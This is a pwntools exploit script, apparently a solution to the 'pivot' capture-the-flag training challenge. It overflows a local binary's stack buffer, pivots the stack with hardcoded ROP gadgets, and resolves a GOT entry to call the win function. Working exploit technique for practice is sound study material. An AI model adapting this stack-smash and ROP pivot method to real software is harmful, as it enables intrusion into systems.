#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
p = process("./pivot")
print(p.recvuntil(b'pivot: ').strip().decode())

# pivot address
pivot_address = p.readline().strip().decode()

print(f"pivot address is {pivot_address}")
print(p.recvuntil(b'>').strip().decode())

# stage 2
# we're at the pivot address now
piv_payload = b''
piv_payload += p64(0x0000000000400720) # plt call to the foothold_func
piv_payload += p64(0x00000000004009bb) # pop rax; ret
piv_payload += p64(0x0000000000601040) # got address of foothold_func
piv_payload += p64(0x00000000004009c0) # mov rax, [rax]; ret
piv_payload += p64(0x00000000004007c8) # pop rbp; ret
piv_payload += p64(0x0000000000000117) # offset between foothold_function and ret2win
piv_payload += p64(0x00000000004009c4) # add rax, rbp; ret
piv_payload += p64(0x00000000004006b0) # call rax

p.send(piv_payload)

print(p.recvuntil(b'>').strip().decode())

# stage 1
# stack smash and pivot
payload = cyclic(40, n=8) # 40 bytes of the buffer, 8 bytes for rbp
payload += p64(0x00000000004009bb) # pop rax; ret
payload += p64(int(pivot_address, 16)) # the address to pivot to
payload += p64(0x00000000004009bd) # xchg rax, rsp; ret

p.send(payload)
log.info("Hacked!")
p.interactive()


















